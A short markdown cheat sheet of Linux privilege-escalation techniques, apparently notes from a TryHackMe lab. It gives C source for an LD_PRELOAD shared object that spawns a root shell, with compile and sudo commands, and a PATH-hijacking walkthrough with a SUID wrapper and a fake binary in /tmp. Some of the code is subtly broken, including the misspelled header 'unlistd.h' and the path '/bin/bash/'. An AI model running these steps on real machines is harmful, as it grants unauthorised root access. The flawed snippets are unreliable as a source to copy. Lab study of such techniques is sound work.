# Linux Privilege Escalation
**************************************

## Leverage LD_PRELOAD

Check for LD_PRELOAD (with env_keep option)
```
sudo -l
```

Write a simple C code compiled as a share object (.so extension) file

* The C code will simply spawn a root shell and can be written as follows:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Save this code as shell.c and compile it using gcc into a shared object file using the following parameters
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Run the program by specifying the LD_PRELOAD option, as follows:
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
**************************************
## PATH

```
echo $PATH
```
* What folders are located under $PATH
* Does your current user have write privileges for any of these folders?
* Can you modify $PATH?
* Is there a script/application you can start that will be affected by this vulnerability?

Example Script: 
```
#include<unlistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("[BINARY]");
}
```
```
gcc path_exp.c -o path -w
```
```
chmod u+s path
```

Search for writable directories:
```
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```
To make a writable directory under $PATH
```
export PATH=/tmp:$PATH
```
```
cd /tmp
```
```
echo "/bin/bash/" > [BINARY]
```
```
chmod 777 [BINARY]
```
```
./path
```
**************************************
## Reference
* https://tryhackme.com/room/linprivesc
